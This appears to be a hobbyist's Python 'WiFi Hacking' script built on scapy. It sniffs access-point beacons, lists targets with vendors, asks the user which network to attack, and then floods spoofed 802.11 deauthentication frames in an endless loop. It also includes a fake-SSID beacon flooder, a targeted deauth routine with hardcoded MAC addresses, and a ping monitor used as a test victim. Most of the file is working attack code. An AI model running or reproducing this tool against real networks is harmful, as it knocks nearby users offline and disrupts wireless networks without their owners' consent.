# WIFI SCANNER  // DEAUTH MODULE // THIS WILL HOLD MALICIOUS LOGIC MEANT FOR ETHICAL REASONS


# UI IMPORTS
import pyfiglet
import pyfiglet.fonts
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.console import Console
console = Console()

# NETWORK IMPORTS
import pywifi, socket, ipaddress
from scapy.all import sniff, RadioTap, IP, ICMP, sr1, sendp, RandMAC
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth



# NSM IMPORTS
from nsm_utilities import Utilities



# ETC IMPORTS 
import threading, os, random, time, pyttsx3

    
# THINGS TO STUDY FOR MATH ASVAB 
MATH = ["percentage", "algebra", "PEMDAS", "Area & Distance", "regular to fraction", "factor equations", "angle of triangle", "area and volume"]


for m in MATH:
    console.print(m)
print("\n\n")


# USE THIS TO INSTALL LIBARIES IN VENV
# source .venv/bin/activate


# RUN THIS FOR NOW TO BEGIN DEAUTH MODULE
# sudo ./.venv/bin/python nsm_deauth.py

class Frame_Snatcher():
    """This class will be responsible for sniffing out frames and or pulling mac address"""


    macs = []   
    beacons = []
    num = 1 


    def __init__(self):
        pass


    
    @classmethod
    def welcome_ui(cls, text="    WiFi \nHacking", font="dos_rebel", c1="bold red", c2="bold purple", skip=False):
        """This method will house the welcome message"""


        # SET THE MODE
        mode = 1



        if mode == 1:


            # CREATE THE VAR
            welcome = pyfiglet.figlet_format(text=text, font=font)
            
            print('\n\n')
            console.print(welcome, style=c2)
            console.print(f"\n[bold red]Current iface:[bold green] {cls.iface}\n\n")
            if skip == False:
                console.input("[bold red]Press ENTER to Sniff! ")
            print('\n')


        

        elif mode == 2:

            fonts = pyfiglet.FigletFont.getFonts()


            for f in fonts:

                welcome = pyfiglet.figlet_format(text=text, font=f)

                console.print(welcome, style=c2)

                console.print(f"[bold blue]Current Font:[bold green] {f}\n\n")
                

                if f == "dos_rebel":
                    t = 3
                
                else:

                    t = 0.3



                time.sleep(t)




    @classmethod
    def sniff_for_targets(cls, iface="wlan0", verbose=1, timeout=15):
        """This method will be used to sniff out mac addresses using the sniff function"""

        # COUNT THE ATTEMPTS
        tempt = 1   


        # LOOP THAT BITCH
        try:
            while True:

                
                # OUTPUT ATTEMPT
                console.print(f"Sniff Attempt #{tempt}", style="bold green")

                    
                # SNIFF THAT BITCH
                sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15)
                
                # APPEND TEMPT
                tempt += 1

                
                # KEEP LOOPING UNTIL TRUE
                if cls.beacons:
                    

                    # SNIFF AGAIN
                    sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15)

                    break
        

        except Exception as e:
            console.print(f"[bold red]\n\nException Error:[yellow] {e}")

            console.input("[bold green]\nPress enter to return the the Main Menu: ")


            # RETURN TO MAIN MODULE
            from nsm_ui import MainUI
            MainUI.main()
            
            

    
    @classmethod
    def packet_parser(cls, pkt):
        """This method will be called upon to then parse the given packet"""



        # COLORS
        c1 = "yellow"
        c2 = "bold red"
        c3 = "bold blue"
        c4 = "bold green"





        # THIS IS STRICTLY USED TO CAPTURE BEACON FRAMES // SENT FROM AP'S
        if pkt.haslayer(Dot11Beacon):

            
            # SET VARS
            addr1 = str(pkt[Dot11].addr1) if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else "No"
            addr2 = str(pkt[Dot11].addr2) if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else "No"


            # GET SSID
            ssid = pkt[Dot11Elt].info.decode(errors="ignore")

            # GET VENDOR
            vendor = Utilities.get_vendor(mac=addr2)

            if vendor:
                text = f"Vendor: {vendor}"
            
            else:
                text = ""



             

            if addr1 not in cls.macs and addr1 != "No":
                

                # ADD MAC
                cls.beacons.append((ssid, addr1, vendor))
                cls.macs.append(addr1)
                cls.num += 1


                # NOW TO OUTPUT RESULTS
                console.print(f"[{c2}][+] Found a new mac addr1:[{c4}] {addr1}")
 


            # BEACON == AP FRAMES ONLY           
            if addr2 not in cls.macs and addr2 != "No":


                # ADD MAC
                cls.beacons.append((ssid, addr2, vendor))
                cls.macs.append(addr2)
                cls.num += 1



                # NOW TO OUTPUT RESULTS
                console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr2}")

   


    
    @classmethod
    def track_clients(cls, target, iface, track=True, delay=5):
        """This method will be responsible for tracking the online clients"""


        # DESTROY ERRORS
        verbose = True

        
        # CREATE A CLIENT LIST

        def sniff_for_clients(timeout=0):
            """This will be used to sniff for clients"""


            console.print("\n -----  SNIFF STARTED  ----- ", style="bold green")
            

            # BEGIN THE SNIFF
            sniff(iface=iface, prn=parse_for_clients, count=0, store=0), #timeout=timeout)
        
            console.print("\n -----  SNIFF ENDED  ----- ", style="bold red")



        def parse_for_clients(pkt):
            """This will be used to parse for clients"""

            

            # FILTER FOR WIFI FRAMES
            if pkt.haslayer(Dot11):


                # ADDR VARS
                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
 
                
                # VALID CLIENTS ONLY
                if addr1 == target or addr2 == target:

                    
                    
                    # ADDR1
                    if addr1 != target and addr1 not in cls.clients and addr1:


                        # ADD TO LIST
                        cls.clients.append(addr1)

                        if verbose:
                            console.print(f"Client: {addr1} --> {target}")

                   
   
                    # ADDR2
                    elif addr2 != target and addr2 not in cls.clients and addr2:


                        # ADD TO LIST
                        cls.clients.append(addr2)

                        if verbose:
                            console.print(f"Client: {addr2} --> {target}")



        # START TRACKING CLIENTS
        threading.Thread(target=sniff_for_clients, daemon=True).start()

        

        #console.print("----- STARTED -----", style="bold green")
        time.sleep(10)

        # LOOP THIS BITCH
        while True:
            
            # RESET CLIENT LIST
            cls.clients = []
            console.print("wiped", style="bold red")
            time.sleep(delay)





    @classmethod
    def target_chooser(cls):
        """In this method the user will choose which target they want to attack"""

       
        # CREATE VARS
        data = {}
        num = 0
        error = False
        verbose = False


        # CREATE A TABLE AND OUTPUT IT
        table = Table(title="Targets", style="bold purple", border_style="bold red", title_style="bold purple", header_style="bold purple")
        table.add_column("Key", style="bold red")
        table.add_column("SSID", style="bold blue")
        table.add_column("MAC Addr", style="bold green")
        table.add_column("Vendor", style="yellow")
        


        # LOOP THROUGH RESULTS
        for var in cls.beacons:


            # APPEND NUMBER
            num +=1 

            # ADD TO DICT
            data[num] = var[1]


            # ADD TO TABLE
            table.add_row(f"{num}", f"{var[0]}",  f"{var[1]}", f"{var[2]}")
            
        

        # CREATE VAR
        keys = num


        
        print('\n\n')
        console.print(table)
        print('\n')



        @staticmethod
        def rescan_option():
            """This function will be used to ask to user weather or not they want to do another scan or continue with the results"""
        
 
            
            # USER INPUT
            choice = console.input("[bold red]Do you want to rescan?[bold green] (y/n): ").strip().lower()


            if choice in ["1", "yes", "y", "go", "yea"]:

                
                
                # RETURN TO MODULE MAIN METHOD
                Utilities.clear_screen()
                Frame_Snatcher.main(skip=True)


            elif choice in [0, "no", "n", "nope", "nah"]:

                return False

            
            else:

                return False
        
        

        # ASK THE USER IF THEY WANT TO RESCAN
        rescan_option()


        
        # DESTROY ERRORS
        while True:
            try:
                
                
                # FOR CLEANER OUTPUT
                if error:
                    console.print(f"\n[bold red]Enter a key[bold red] 1 - {num},[bold green] to choose your target!")
                    error = False 


                # USER CHOOSES THERE TARGET
                choice = console.input(f"[bold red]Who do you want to attack?: ").strip()

                # INT IT 
                choice = int(choice)



                if choice in range(1, num) or choice == num:
                    target = data[choice]


                    console.print(f"\n[bold red]Target choosen:[yellow] {target}")

                    
                    # RETURN THE TARGET
                    return target
                
                

                # OUTSIDE OF NUM
                else:
                    error = True
                    
            
            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except KeyError as e:
                
                if verbose:
                    console.print(e)


                error = True

            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except TypeError as e:

                if verbose:
                    console.print(e)


                error = True
            

        
            
            # ELSE
            except Exception as e:

                if verbose:

                    console.print(f"[bold red]Exception Error:[yellow] {e}")

                
                if error == False:
                    error = 1
                
                elif error:
                    error += 1
                

                # SAFETY CATCH
                if error == 4:

                    console.print("Alright ur done for", style="bold red")
                    break

       

    @classmethod
    def target_attacker(cls, target, client="ff:ff:ff:ff:ff:ff", verbose=1, iface="wlan0", inter=0.1, count=25):
        """This method will be responsible for attacking the choosen target"""


        # VARS
        packets_sent = 0
        error = 0

        
        # BEGINNING OF THE END
        use = 2
        if use == 1:
            console.print(f"\n[bold red]Now Launching Attack on:[bold green] {target}\n\n")
        elif use == 2:
            console.print(f"\n[bold red]Attacking  ----->  [bold green]{target}[/bold green]  <-----  Attacking\n\n")

        time.sleep(2)



        # CREATE LIVE PANEL
        down = 5
        panel = Panel(renderable=f"Launching Attack in {down}", style="bold purple", border_style="bold red", expand=False, title="Attack Status")




        # LOOP UNTIL CTRL + C
        with Live(panel, console=console, refresh_per_second=4):


            # UPDATE RENDERABLE THIS IS THE COUNTDOWN UNTIL START
            while down > 0:
                
                # OUTPUT N UPDATE
                panel.renderable = f"Launching Attack in: {down}"
                down -= 1
                
                # NOW FOR THE ACTUAL DELAY LOL
                time.sleep(1)

            
            # NOW FOR THE ATTACK
            while True:
                try:


                    
                    # GET REASON FOR BEING KICKED OFF / CHOOSE DIFFERENT ONES IN CASE SOME WORK BETTER THEN OTHERS
                    reasons = random.choice([4,5,7,15])

                    # CREATE THE LAYER 2 FRAME
                    frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reasons)


                    # NOW TO SEND THE FRAME
                    sendp(frame, iface=iface, inter=inter, count=count, verbose=verbose)


                    # UPDATE VAR & PANEL
                    packets_sent += count

                    # COLORS
                    c1 = "bold red"

                    panel.renderable = (
                        f"[{c1}]Target:[/{c1}] {target}  -  " 
                        f"[{c1}]Total Packets Sent:[/{c1}] {packets_sent}  -"  
                        f"[{c1}]Reason:[/{c1}] {reasons}  -  "  
                        f"[{c1}]Clients:[/{c1}] {len(cls.clients)}"

                        )
                    
            


                except KeyboardInterrupt as e:
                    console.print(e)

                    break
                

                except Exception as e:
                    console.print(f"[bold red]Exception Error:[yellow] {e}")


                    if error < 4:
                        error += 1
                    
                    else:
                        
                        console.print("[bold red]Max Amount of Errors Given!")
                        break
                    
    

    @classmethod
    def main(cls, skip=False):
        """This is where the module will spawn from"""


        # CLEAR SCREEN
        Utilities.clear_screen()


        # CLEAN VARS
        cls.macs = []
        cls.beacons = []
        cls.num = 1
        cls.clients = []

        
        # GET GLOBAL IFACE
        cls.iface = console.input("Enter Interface: ").strip() 

        if cls.iface == "":
            cls.iface = "wlan0"


        # PRINT WELCOME UI
        Frame_Snatcher.welcome_ui(skip=skip)

        
        # SNIFF FOR TARGETS
        Frame_Snatcher.sniff_for_targets(iface=cls.iface)


        # ALLOW THE USER TO CHOOSE THERE TARGET
        target = Frame_Snatcher.target_chooser()


        # NOW TO TRACK THE AMOUNT OF CLIENTS ON THE AP
        threading.Thread(target=Frame_Snatcher.track_clients, args=(target, cls.iface), daemon=True).start()


        # NOW TO ATTACK THE TARGET
        Frame_Snatcher.target_attacker(target=target, iface=cls.iface)      




        # END
        console.print("\n\nThank you for trying out my program", style="bold red") 

        time.sleep(3)





class Beacon_Flooder():
    """This class will be responsible for performing beacon attacks and maybe Probe flooding """



    def __init__(self):
        pass



    @classmethod
    def beacon_packet(cls):
        """Create the beacon packet"""


        # VARS
        num = 0
        ssids = [
            "I AM NOT REAL",
            "HOWDY HOW ARE YOU DOING",
            "TESTING WPA ACCESS",
            "THIS IS FOR UR SAFETY",
            "HEY HEY HEY",
            "DUDE DUE DUE"
        ]

        
        while num < 5:


            # GET A RANDOM MAC
            mac = RandMAC()
            ssid = random.choice(ssids)


            frame = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) / Dot11Beacon(cap="ESS+privacy") / Dot11Elt(ID="SSID", info=ssid)


            sendp(frame, inter=0.1, count=1, iface="wlan1")

            num += 1
        


    



class Deauth_You():
    """This module will be responsible for crafting and sending deauth packets"""

    # CLASS VARS
    captures = {}



    def __init__(self):
        pass



    @classmethod
    def death_all(cls, client_mac, ap_mac, iface="wlan0", verbose=1, inter=0, packets=500):
        """This method will be used to send deauth frames to any and all devices found within the area"""

        
        try:

            # CREATE THE DEAUTH FRAME
            reasons = random.choice([7,4,5,15])
            dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)  # ADDR1 = RECIEVER ADDR2 = SENDER, ADDR3 = REAL AP
            frame = RadioTap() / dot11 / Dot11Deauth(reason=reasons)  # REASON = THE REASON THERE BEING KICKED OFF


            # NOW TO SEND THE FRAME
            console.print(ap_mac)
            
            if ap_mac.strip() == "aa:95:dd:e8:c5:53":

                
                loop = 1

                while loop <= 100: 

                    # RECREATE FRAME
                    reasons = random.choice([7,4,5,15])
                    frame = RadioTap() / dot11 / Dot11Deauth(reason=reasons) / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)

                    sendp(frame, iface=iface, verbose=verbose, inter=0.1, count=25)

                    console.print(f"Performing Targeted Deauth #{loop}", style="bold green")

                    loop += 1
            
            else:

               # while loop < 30:
                sendp(frame, iface=iface, verbose=verbose, inter=inter, count=packets)

                   # loop += 1
    

            console.print(f"Frames Successfully sent", style="bold green")
        
        
        except OSError as e:
            console.print(f"[bold red]Deauth OS Error:[yellow] {e}")


        except Exception as e:
            console.print(f"[bold red]Exception Error:[yellow] {e}")

    
    @classmethod
    def packet_parser(cls, pkt, type=2):
        "This method is responsible for crafting the actual deauth packets"

        
        # YOUR MONITOR MODE INTERFACE
        iface = 'wlan1mon'
        

        # COLORS
        c1 = "bold red"
        c2 = "bold green"
        c3 = "bold blue"
        c4 = "bold yellow"
        

        # CHECK IF ITS A DOT11 PACKET
        if type == 1:
            if pkt.haslayer(Dot11):
                console.print(f"[{c1}][+] Packet:[{c2}] {pkt.addr1} [{c4}]--> [{c2}] {pkt.addr2}")
        

        # FOR BEACON FRAMES
        elif type == 2:
            if pkt.haslayer(Dot11Beacon):
                

                if pkt.addr2 == "3E:6E:B6:08:E3:1F":
                    console.print(f"Iphone found: {pkt.addr2}", style="bold green")




# THIS CLASS IS STRICTLY TO BE USED AS A VICTIM NODE TO TEST IF THIS MODULE IS FUNCTIONAL 
class You_Cant_DOS_ME():
    """This is testing ground for weather or not i can withstand a ddos attack"""


    def __init__(self):
        pass


    @classmethod
    def ping(cls, host="google.com", timeout=4, verbose=False):
        """Create the ping packet and send it out"""


        # PRINT WELCOME
        text = pyfiglet.figlet_format(text="DOS\n ME", font="bloody")
        console.print(text, style="bold red")

        console.input("\n[bold red]ARE U READY ?: ")
        
        online = True
        pings = 0

        # TALK SHII FOR FUN
        talks = [
            "You can't hit me offline — I host the cloud.",
            "Yawn... I'm still online.",
            "Your net too slow to even scan me.",
            "My packets run laps around yours.",
            "Bro I deauth for fun.",
            "Your IP is giving home router energy.",
            "My Wi-Fi's got better uptime than your excuses.",
            "I don't lag — I throttle reality.",
            "My ping is lower than your standards.",
            "Try harder... I'm behind 3 VPNs and your girl’s Wi-Fi.",
            "You scan ports, I open wormholes.",
            "Your whole setup runs on hope and Starbucks Wi-Fi.",
            "Deauth me? I deauth back with feelings.",
            "Nice packet — shame it never reached me.",
            "You can’t trace me — I lost myself years ago."
        ]


        try:
            
            # CREATE PACKET AND GET HOST
            ip = socket.gethostbyname(str(host))
            console.print(IP)
            ping = IP(dst=ip) / ICMP()

            
            # ERROR CHECK
            console.print(ping)
            time.sleep(3)
        
        except Exception as e:
            console.print(f"[bold red]Socket Exception Error: {e}")
            
            
        # LOOP THAT BITCH
        while online:

            try:
            
                # TRACK PING TIME
                time_start = time.time()
                response = sr1(ping, timeout=timeout, verbose=verbose)

                time_took = time.time() - time_start

                
                if response:
                    console.print(f"[bold blue]Connection Status: [bold green]Online  -  Ping Latency: {time_took:.2f}")
                

                else:
                    console.print(f"[bold blue]Connection Status: [bold red]Offline  -  I HATE YOU")



                    

                
                pings += 1 
                if time_took < 1.0:
                    time.sleep(1.5)


                ran = random.randint(0,10)

                if ran == 4:

                    console.print(talks[random.randint(0,14)])


                
        

            except Exception as e:

                # SET ONLINE TO FALSE
                console.print(f"[bold red]Exception Error: {e}")




# FOR MODULE TESTING
if __name__ == "__main__":
    

    use = 3


    if use == 1:
        Frame_Snatcher.main()
    


    elif use == 2:
        You_Cant_DOS_ME.ping()


    
    elif use == 3:


        Beacon_Flooder.beacon_packet()



